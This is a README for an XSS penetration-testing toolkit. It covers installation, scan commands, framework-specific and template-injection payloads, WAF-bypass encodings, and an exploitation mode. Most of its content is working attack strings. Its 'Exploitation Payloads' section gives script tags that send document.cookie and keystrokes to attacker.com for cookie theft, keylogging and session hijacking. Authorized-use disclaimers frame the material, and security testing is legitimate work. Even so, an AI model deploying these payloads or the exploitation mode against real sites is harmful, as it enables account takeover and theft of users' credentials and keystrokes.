# XSS Attack Suite v3.0

A comprehensive Cross-Site Scripting (XSS) penetration testing framework for authorized security testing. Supports PHP, Python, Java, Node.js, React, Angular, and Vue.js.

## ⚠️ Disclaimer

**This tool is for authorized penetration testing and security assessment ONLY.**

- Only use on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal
- The author is not responsible for misuse of this tool
- Always follow responsible disclosure practices

## Features

- **Framework Detection** - Auto-detects PHP, Python, Java, Node.js, React, Angular, Vue.js
- **WAF Bypass** - Case variation, encoding, nested tags, protocol handlers
- **Context-Aware** - HTML, attribute, JavaScript, URL, comment contexts
- **DOM-Based XSS** - Detects and tests dangerous DOM sinks
- **Exploitation Mode** - Cookie stealing, keylogging, session hijacking
- **Framework-Specific** - Payloads tailored for each framework
- **Batch Scanning** - Test multiple URLs at once
- **Report Generation** - Detailed reports with context and framework info

## Installation

```bash
# Navigate to tool directory
cd "H:\Kali Tools\XSS"

# Install dependencies
pip3 install -r requirements.txt

# Make scripts executable (Kali/Linux)
chmod +x *.sh *.py

# Run the suite (menu mode)
./xss_suite.sh
# or
python3 xss_suite.py
```

## Tools Included

| Tool | Description |
|------|-------------|
| `xss_suite.py` | Main menu-based interface |
| `xss_tool.py` | Basic XSS scanner |
| `advanced_xss.py` | Advanced scanner with WAF bypass & exploitation |
| `framework_scanner.py` | Framework-specific testing |
| `payload_generator.py` | Generate payloads for any context |
| `quick_scan.py` | Fast simplified scanner |
| `batch_scan.py` | Test multiple URLs |

## Usage Examples

### Basic Scan
```bash
python3 xss_tool.py -u "http://target.com/page?id=1"
```

### Advanced Scan (WAF Bypass)
```bash
python3 advanced_xss.py -u "http://target.com/page?id=1" -s full
```

### Framework-Specific Scan
```bash
python3 framework_scanner.py "http://target.com" php
python3 framework_scanner.py "http://target.com" react
python3 framework_scanner.py "http://target.com" angular
```

### DOM-Based XSS Scan
```bash
python3 advanced_xss.py -u "http://target.com" --dom-xss
```

### Exploitation Mode
```bash
python3 advanced_xss.py -u "http://target.com/?id=1" -s full --exploit --attacker http://yourserver.com
```

### Payload Generator
```bash
python3 payload_generator.py html generic
python3 payload_generator.py attribute react
python3 payload_generator.py javascript php --encode
```

### Batch Scan
```bash
python3 xss_tool.py -f targets.txt -s advanced
```

## Scan Types

| Type | Description |
|------|-------------|
| `basic` | Common XSS payloads |
| `advanced` | WAF bypass, encoding, framework-specific |
| `full` | All payloads including DOM, CSP bypass, exploitation |

## Framework Support

| Framework | Key Payloads |
|-----------|--------------|
| **PHP** | `<?php echo "<script>alert(1)</script>"; ?>`, `{{config.items()}}` |
| **Python/Django** | `{{ "".__class__.__mro__[1].__subclasses__() }}` |
| **Java/Spring** | `<%= Runtime.getRuntime().exec("calc") %>`, `${7*7}` |
| **Node.js/Express** | `<%= alert(1) %>`, `\`${alert(1)}\`` |
| **React** | `{alert(1)}`, `javascript:alert(1)` |
| **Angular** | `{{constructor.constructor("return this")().alert(1)}}` |
| **Vue.js** | `<svg @load=alert(1)>`, `v-on:load=alert(1)` |

## Context-Aware Payloads

### HTML Body
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Attribute Context (breaking quotes)
```html
" onmouseover="alert(1)"
' onfocus='alert(1)' autofocus='
" onclick="alert(1)"
```

### JavaScript Context (breaking strings)
```javascript
';alert(1)//
";alert(1)//
';alert(1);var x='
```

### URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## WAF Bypass Techniques

| Technique | Example |
|-----------|---------|
| Case Variation | `<ScRiPt>alert(1)</ScRiPt>` |
| Nested Tags | `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| HTML Entities | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| Double Encoding | `%253Cscript%253Ealert(1)%253C%252Fscript%253E` |
| Protocol Handlers | `javascript:alert(1)` |
| Base64 | `<script>eval(atob("YWxlcnQoMSk="))</script>` |

## Exploitation Payloads

### Cookie Stealing
```html
<script>fetch("http://attacker.com/?c="+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### Keylogging
```html
<script>document.onkeypress=function(e){fetch("http://attacker.com/?k="+e.key)};</script>
```

### Session Hijacking
```html
<script>document.location="http://attacker.com/?c="+document.cookie</script>
```

## Output

Reports are saved as `xss_report_YYYYMMDD_HHMMSS.txt` containing:
- Scan date and time
- Target URL
- Detected framework
- Vulnerability type (reflected, DOM, form)
- Successful payload
- Context where payload was reflected

## Tips for Effective Testing

1. **Start with framework detection** to get context-appropriate payloads
2. **Test different contexts** (HTML, attribute, JavaScript, URL)
3. **Try WAF bypass techniques** if basic payloads are filtered
4. **Check for DOM sinks** for client-side vulnerabilities
5. **Use exploitation mode** to verify impact (cookie stealing, etc.)
6. **Document everything** for your penetration test report

## Legal Notice

This tool is provided for educational and authorized security testing purposes only. Users are responsible for ensuring they have proper authorization before using this tool. Misuse of this tool for unauthorized access to computer systems is illegal and may result in criminal prosecution.
